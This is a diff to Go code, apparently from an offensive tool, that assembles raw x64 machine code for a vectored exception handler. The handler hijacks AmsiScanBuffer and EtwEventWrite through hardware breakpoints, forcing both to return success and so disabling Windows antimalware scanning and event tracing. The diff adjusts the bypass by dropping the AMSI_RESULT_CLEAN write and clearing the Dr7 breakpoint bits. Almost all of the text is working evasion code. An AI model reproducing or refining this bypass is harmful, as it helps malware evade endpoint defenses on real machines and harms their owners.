@@ -229,29 +229,20 @@ func buildNativeVEHHandler(amsiAddr, etwAddr uintptr) (handlerAddr uintptr, data
 	code = append(code, 0x00) // placeholder
 
 	// AMSI match: redirect execution to an embedded "xor eax,eax; ret" gadget.
-	// The gadget executes "xor eax, eax; ret", naturally returning S_OK (0)
-	// to AmsiScanBuffer's caller via the CPU's native RET instruction.
-	//
-	// Also write AMSI_RESULT_CLEAN (0) to the output parameter (6th arg at
-	// [Rsp+0x30]) so the caller sees a clean scan result.
-	//
-	// Write AMSI_RESULT_CLEAN to output param:
-	// Load context.Rsp
-	code = append(code, 0x48, 0x8B, 0x83)             // mov rax, [rbx+0x98]
-	code = append(code, 0x98, 0x00, 0x00, 0x00)
-	// Load AMSI_RESULT* from [Rsp+0x30] (6th parameter)
-	code = append(code, 0x48, 0x8B, 0x40, 0x30)       // mov rax, [rax+0x30]
-	// Test rax, rax (skip write if NULL pointer)
-	code = append(code, 0x48, 0x85, 0xC0)             // test rax, rax
-	code = append(code, 0x74, 0x06)                   // jz skip_write (over next 6 bytes)
-	// Write AMSI_RESULT_CLEAN (0) to *result
-	code = append(code, 0xC7, 0x00, 0x00, 0x00, 0x00, 0x00) // mov dword [rax], 0
-	// skip_write:
+	// The gadget executes naturally via the CPU's RET instruction, returning
+	// S_OK (0) to AmsiScanBuffer's caller with correct stack unwinding.
 	// Load gadget address from data block: rax = [r13+0x10]
 	code = append(code, 0x49, 0x8B, 0x45, 0x10)       // mov rax, [r13+0x10]
 	// Set context.Rip to gadget address: [rbx+0xF8] = rax
 	code = append(code, 0x48, 0x89, 0x83)             // mov [rbx+disp32], rax
 	code = append(code, 0xF8, 0x00, 0x00, 0x00)       // disp32 = 0xF8 (Rip)
+	// Disable Dr0 (AMSI breakpoint) by clearing bit 0 of Dr7 in context
+	// so the breakpoint doesn't fire on subsequent calls from this thread.
+	code = append(code, 0x48, 0x8B, 0x83)             // mov rax, [rbx+0x70]
+	code = append(code, 0x70, 0x00, 0x00, 0x00)       // Dr7 offset
+	code = append(code, 0x48, 0x83, 0xE0, 0xFE)       // and rax, ~1 (clear bit 0)
+	code = append(code, 0x48, 0x89, 0x83)             // mov [rbx+0x70], rax
+	code = append(code, 0x70, 0x00, 0x00, 0x00)
 	// Clear Dr6: [rbx+0x68] = 0
 	code = append(code, 0x48, 0xC7, 0x83)             // mov qword [rbx+0x68], 0
 	code = append(code, 0x68, 0x00, 0x00, 0x00)
@@ -285,14 +276,18 @@ func buildNativeVEHHandler(amsiAddr, etwAddr uintptr) (handlerAddr uintptr, data
 	code = append(code, 0x00) // placeholder
 
 	// ETW match: redirect execution to the same "xor eax,eax; ret" gadget.
-	// EtwEventWrite returns ULONG (0 = success), so xor eax,eax; ret works
-	// the same way as for AMSI: redirect Rip to the gadget, let the CPU's
-	// native RET instruction handle proper stack unwinding.
+	// EtwEventWrite returns ULONG (0 = success).
 	// Load gadget address from data block: rax = [r13+0x10]
 	code = append(code, 0x49, 0x8B, 0x45, 0x10)       // mov rax, [r13+0x10]
 	// Set context.Rip to gadget address: [rbx+0xF8] = rax
 	code = append(code, 0x48, 0x89, 0x83)             // mov [rbx+disp32], rax
 	code = append(code, 0xF8, 0x00, 0x00, 0x00)       // disp32 = 0xF8 (Rip)
+	// Disable Dr1 (ETW breakpoint) by clearing bit 2 of Dr7 in context
+	code = append(code, 0x48, 0x8B, 0x83)             // mov rax, [rbx+0x70]
+	code = append(code, 0x70, 0x00, 0x00, 0x00)       // Dr7 offset
+	code = append(code, 0x48, 0x83, 0xE0, 0xFB)       // and rax, ~4 (clear bit 2)
+	code = append(code, 0x48, 0x89, 0x83)             // mov [rbx+0x70], rax
+	code = append(code, 0x70, 0x00, 0x00, 0x00)
 	// Clear Dr6: [rbx+0x68] = 0
 	code = append(code, 0x48, 0xC7, 0x83)             // mov qword [rbx+0x68], 0
 	code = append(code, 0x68, 0x00, 0x00, 0x00)
